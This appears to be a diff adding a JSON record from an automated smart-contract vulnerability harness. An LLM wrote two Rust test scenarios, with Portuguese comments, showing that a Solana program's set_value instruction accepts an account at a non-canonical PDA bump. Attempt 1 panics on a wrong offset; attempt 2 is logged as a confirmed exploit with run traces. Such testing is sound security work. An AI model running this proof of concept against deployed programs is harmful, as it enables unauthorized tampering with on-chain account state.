@@ -1,0 +1,207 @@
+{
+  "category": "PDA",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2272,
+        "completion_tokens": 865,
+        "latency_s": 4.88
+      },
+      "raw": "{\n  \"plan\": \"O cenário monta uma conta DataAccount existente (dono = programa) e uma carteira signer. O baseline chama set_value com o bump canônico do PDA derivado de [b\\\"data\\\", user, bump], provando que o cenário está correto. O ataque repete a mesma chamada, mas passa um bump não canônico (menor que o canônico) e a conta DataAccount no endereço correspondente a esse bump não canônico. O efeito medido é que a instrução aceitou uma conta cujo endereço difere do PDA canônico, gravando o bump não canônico na conta.\",\n  \"scenario\": \"let user = Pubkey::new_unique();\\nlet (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b\\\"data\\\", user.as_ref()], &env.program_id);\\n\\n// Encontra o primeiro bump abaixo do canônico para o qual create_program_address retorna Ok\\nlet mut non_canonical_bump = canonical_bump.wrapping_sub(1);\\nlet mut non_canonical_pda = Pubkey::create_program_address(&[b\\\"data\\\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\\nwhile non_canonical_pda.is_err() && non_canonical_bump > 0 {\\n    non_canonical_bump = non_canonical_bump.wrapping_sub(1);\\n    non_canonical_pda = Pubkey::create_program_address(&[b\\\"data\\\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\\n}\\nlet non_canonical_pda = non_canonical_pda.unwrap_or(canonical_pda);\\n\\nlet data_account = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, canonical_bump)),\\n    None,\\n);\\nlet user_account = wallet(1_000_000_000);\\n\\nlet contas = vec![\\n    (canonical_pda, data_account.clone()),\\n    (user, user_account.clone()),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(canonical_bump, 42u64),\\n    vec![\\n        AccountMeta::new(canonical_pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\nlet r_base = env.baseline(\\\"set_value legitimo com bump canonico\\\", &ix_baseline, &contas);\\n\\nlet contas_ataque = vec![\\n    (non_canonical_pda, data_account),\\n    (user, user_account),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(non_canonical_bump, 42u64),\\n    vec![\\n        AccountMeta::new(non_canonical_pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\nlet r = env.attack(\\\"set_value com bump nao canonico\\\", &ix_ataque, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let bump_gravado = after(&r, &non_canonical_pda).data()[40 + 32 + 8];\\n    env.effect(\\n        \\\"conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado\\\",\\n        non_canonical_pda != canonical_pda && bump_gravado == non_canonical_bump,\\n    );\\n}\"\n}",
+      "plan": "O cenário monta uma conta DataAccount existente (dono = programa) e uma carteira signer. O baseline chama set_value com o bump canônico do PDA derivado de [b\"data\", user, bump], provando que o cenário está correto. O ataque repete a mesma chamada, mas passa um bump não canônico (menor que o canônico) e a conta DataAccount no endereço correspondente a esse bump não canônico. O efeito medido é que a instrução aceitou uma conta cujo endereço difere do PDA canônico, gravando o bump não canônico na conta.",
+      "scenario": "let user = Pubkey::new_unique();\nlet (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b\"data\", user.as_ref()], &env.program_id);\n\n// Encontra o primeiro bump abaixo do canônico para o qual create_program_address retorna Ok\nlet mut non_canonical_bump = canonical_bump.wrapping_sub(1);\nlet mut non_canonical_pda = Pubkey::create_program_address(&[b\"data\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\nwhile non_canonical_pda.is_err() && non_canonical_bump > 0 {\n    non_canonical_bump = non_canonical_bump.wrapping_sub(1);\n    non_canonical_pda = Pubkey::create_program_address(&[b\"data\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\n}\nlet non_canonical_pda = non_canonical_pda.unwrap_or(canonical_pda);\n\nlet data_account = account(\n    &env.program_id,\n    &anchor_account_data(\"DataAccount\", &(user, 0u64, canonical_bump)),\n    None,\n);\nlet user_account = wallet(1_000_000_000);\n\nlet contas = vec![\n    (canonical_pda, data_account.clone()),\n    (user, user_account.clone()),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"set_value\",\n    &(canonical_bump, 42u64),\n    vec![\n        AccountMeta::new(canonical_pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\nlet r_base = env.baseline(\"set_value legitimo com bump canonico\", &ix_baseline, &contas);\n\nlet contas_ataque = vec![\n    (non_canonical_pda, data_account),\n    (user, user_account),\n];\n\nlet ix_ataque = env.anchor_ix(\n    \"set_value\",\n    &(non_canonical_bump, 42u64),\n    vec![\n        AccountMeta::new(non_canonical_pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\nlet r = env.attack(\"set_value com bump nao canonico\", &ix_ataque, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let bump_gravado = after(&r, &non_canonical_pda).data()[40 + 32 + 8];\n    env.effect(\n        \"conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado\",\n        non_canonical_pda != canonical_pda && bump_gravado == non_canonical_bump,\n    );\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "set_value legitimo com bump canonico",
+            "result": "Success",
+            "compute_units": 3713,
+            "account_flags": "-w,sr",
+            "ix_head": "6873cfa3d394de05",
+            "accounts": [
+              {
+                "key": "5k8VPTWzarXPgXNDfMErD2DiDk1iPzPPrvLA4ssr7jdm",
+                "signer": false,
+                "writable": true,
+                "owner": "x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm",
+                "data_len": 49,
+                "head": "55f0b69e4c0712e9",
+                "digest": "2dbba05e82888ffc",
+                "post": "55f0b69e4c0712e900000000000000010000000000000000000000000000000000000000000000002a00000000000000fe"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "set_value com bump nao canonico",
+            "result": "Success",
+            "compute_units": 3713,
+            "account_flags": "-w,sr",
+            "ix_head": "6873cfa3d394de05",
+            "accounts": [
+              {
+                "key": "AQNS5jcDxfAHDCMKnNT6LUgN9WMti1gHsPUQHUvKRxvf",
+                "signer": false,
+                "writable": true,
+                "owner": "x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm",
+                "data_len": 49,
+                "head": "55f0b69e4c0712e9",
+                "digest": "2dbba05e82888ffc",
+                "post": "55f0b69e4c0712e900000000000000010000000000000000000000000000000000000000000000002a00000000000000fd"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "thread 'scenario' (21644) panicked at tests/attempt.rs:59:28: index out of bounds: the len is 49 but the index is 80",
+        "runtime_trace": [
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 3713 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 3713 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque foi aceito, mas o cenario entrou em panico ao medir o efeito: thread 'scenario' (21644) panicked at tests/attempt.rs:59:28: index out of bounds: the len is 49 but the index is 80"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3010,
+        "completion_tokens": 856,
+        "latency_s": 4.36
+      },
+      "raw": "{\"plan\": \"O cenário anterior montou corretamente as contas e o ataque foi aceito, mas o cálculo do offset para ler o campo `bump` estava errado: o layout do DataAccount é discriminador(8) + user(32) + value(8) + bump(1), então o bump fica no offset 48, não 80. Vou corrigir o offset e também usar o estado resultante do baseline para o ataque, garantindo que a conta do ataque seja a mesma conta mutada. O efeito mede que uma conta com endereço diferente do PDA canônico foi aceita e que o bump não canônico foi gravado.\", \"scenario\": \"let user = Pubkey::new_unique();\\nlet (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b\\\"data\\\", user.as_ref()], &env.program_id);\\n\\n// Encontra o primeiro bump abaixo do canônico para o qual create_program_address retorna Ok\\nlet mut non_canonical_bump = canonical_bump.wrapping_sub(1);\\nlet mut non_canonical_pda = Pubkey::create_program_address(&[b\\\"data\\\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\\nwhile non_canonical_pda.is_err() && non_canonical_bump > 0 {\\n    non_canonical_bump = non_canonical_bump.wrapping_sub(1);\\n    non_canonical_pda = Pubkey::create_program_address(&[b\\\"data\\\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\\n}\\nlet non_canonical_pda = non_canonical_pda.unwrap_or(canonical_pda);\\n\\nlet data_account = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, canonical_bump)),\\n    None,\\n);\\nlet user_account = wallet(1_000_000_000);\\n\\nlet contas = vec![\\n    (canonical_pda, data_account.clone()),\\n    (user, user_account.clone()),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(canonical_bump, 42u64),\\n    vec![\\n        AccountMeta::new(canonical_pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\nlet r_base = env.baseline(\\\"set_value legitimo com bump canonico\\\", &ix_baseline, &contas);\\n\\nlet contas_ataque = vec![\\n    (non_canonical_pda, data_account),\\n    (user, user_account),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(non_canonical_bump, 42u64),\\n    vec![\\n        AccountMeta::new(non_canonical_pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\nlet r = env.attack(\\\"set_value com bump nao canonico\\\", &ix_ataque, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let bump_gravado = after(&r, &non_canonical_pda).data()[48];\\n    env.effect(\\n        \\\"conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado\\\",\\n        non_canonical_pda != canonical_pda && bump_gravado == non_canonical_bump,\\n    );\\n}\"}",
+      "plan": "O cenário anterior montou corretamente as contas e o ataque foi aceito, mas o cálculo do offset para ler o campo `bump` estava errado: o layout do DataAccount é discriminador(8) + user(32) + value(8) + bump(1), então o bump fica no offset 48, não 80. Vou corrigir o offset e também usar o estado resultante do baseline para o ataque, garantindo que a conta do ataque seja a mesma conta mutada. O efeito mede que uma conta com endereço diferente do PDA canônico foi aceita e que o bump não canônico foi gravado.",
+      "scenario": "let user = Pubkey::new_unique();\nlet (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b\"data\", user.as_ref()], &env.program_id);\n\n// Encontra o primeiro bump abaixo do canônico para o qual create_program_address retorna Ok\nlet mut non_canonical_bump = canonical_bump.wrapping_sub(1);\nlet mut non_canonical_pda = Pubkey::create_program_address(&[b\"data\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\nwhile non_canonical_pda.is_err() && non_canonical_bump > 0 {\n    non_canonical_bump = non_canonical_bump.wrapping_sub(1);\n    non_canonical_pda = Pubkey::create_program_address(&[b\"data\", user.as_ref(), &[non_canonical_bump]], &env.program_id);\n}\nlet non_canonical_pda = non_canonical_pda.unwrap_or(canonical_pda);\n\nlet data_account = account(\n    &env.program_id,\n    &anchor_account_data(\"DataAccount\", &(user, 0u64, canonical_bump)),\n    None,\n);\nlet user_account = wallet(1_000_000_000);\n\nlet contas = vec![\n    (canonical_pda, data_account.clone()),\n    (user, user_account.clone()),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"set_value\",\n    &(canonical_bump, 42u64),\n    vec![\n        AccountMeta::new(canonical_pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\nlet r_base = env.baseline(\"set_value legitimo com bump canonico\", &ix_baseline, &contas);\n\nlet contas_ataque = vec![\n    (non_canonical_pda, data_account),\n    (user, user_account),\n];\n\nlet ix_ataque = env.anchor_ix(\n    \"set_value\",\n    &(non_canonical_bump, 42u64),\n    vec![\n        AccountMeta::new(non_canonical_pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\nlet r = env.attack(\"set_value com bump nao canonico\", &ix_ataque, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let bump_gravado = after(&r, &non_canonical_pda).data()[48];\n    env.effect(\n        \"conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado\",\n        non_canonical_pda != canonical_pda && bump_gravado == non_canonical_bump,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "set_value legitimo com bump canonico",
+            "result": "Success",
+            "compute_units": 3713,
+            "account_flags": "-w,sr",
+            "ix_head": "6873cfa3d394de05",
+            "accounts": [
+              {
+                "key": "5k8VPTWzarXPgXNDfMErD2DiDk1iPzPPrvLA4ssr7jdm",
+                "signer": false,
+                "writable": true,
+                "owner": "x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm",
+                "data_len": 49,
+                "head": "55f0b69e4c0712e9",
+                "digest": "2dbba05e82888ffc",
+                "post": "55f0b69e4c0712e900000000000000010000000000000000000000000000000000000000000000002a00000000000000fe"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "set_value com bump nao canonico",
+            "result": "Success",
+            "compute_units": 3713,
+            "account_flags": "-w,sr",
+            "ix_head": "6873cfa3d394de05",
+            "accounts": [
+              {
+                "key": "AQNS5jcDxfAHDCMKnNT6LUgN9WMti1gHsPUQHUvKRxvf",
+                "signer": false,
+                "writable": true,
+                "owner": "x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm",
+                "data_len": 49,
+                "head": "55f0b69e4c0712e9",
+                "digest": "2dbba05e82888ffc",
+                "post": "55f0b69e4c0712e900000000000000010000000000000000000000000000000000000000000000002a00000000000000fd"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 3713 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 3713 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado"
+    }
+  ],
+  "case_id": "SSP-05-A-V",
+  "static_finding": {
+    "category": "PDA",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Improper PDA Validation / Canonicalization."
+  }
+}
